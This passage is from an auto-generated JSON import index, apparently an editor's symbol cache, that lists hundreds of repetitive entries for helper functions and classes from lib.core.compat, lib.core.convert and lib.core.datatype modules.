        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "LooseVersion",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "LooseVersion",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "choose_boundary",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "lib.core.convert",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "base64pickle",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "base64unpickle",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "htmlUnescape",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "stdoutEncode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getConsoleLength",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "htmlEscape",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "stdoutEncode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "htmlUnescape",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "htmlUnescape",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "dejsonize",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "jsonize",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "htmlUnescape",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getConsoleLength",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getText",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getUnicode",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "encodeBase64",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "decodeHex",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getOrds",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "getBytes",
        "importPath": "lib.core.convert",
        "description": "lib.core.convert",
        "isExtraImport": true,
        "detail": "lib.core.convert",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "InjectionDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "LRUDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "InjectionDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "InjectionDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
